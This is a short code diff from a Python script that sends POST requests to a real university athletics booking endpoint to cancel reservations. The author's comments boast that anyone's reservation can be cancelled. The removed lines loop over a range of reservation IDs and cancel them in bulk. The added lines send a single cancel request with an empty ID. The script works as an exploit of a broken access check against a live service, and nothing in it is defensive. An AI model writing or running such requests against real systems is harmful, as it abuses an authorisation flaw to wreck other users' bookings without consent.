@@ -28,10 +28,6 @@ print(response.status_code)
 # This shouldn't work, but it does LOL
 # CANCEL RESERVATION OF ANYONE!!!! (very secure)
 
-count = 0
-for i in range(37530, 37630):
-    if count % 10 == 0:
-        response = driver.request('POST', 'https://www.laurierathletics.com/ecommerce/user/backendcrud.php',
-                                  data={"ReservationID": str(i), "reservationcancel": "1"})
-        print(response.status_code)
-    count += 1
+
+response = driver.request('POST', 'https://www.laurierathletics.com/ecommerce/user/backendcrud.php',
+                          data={"ReservationID": "", "reservationcancel": "1"})
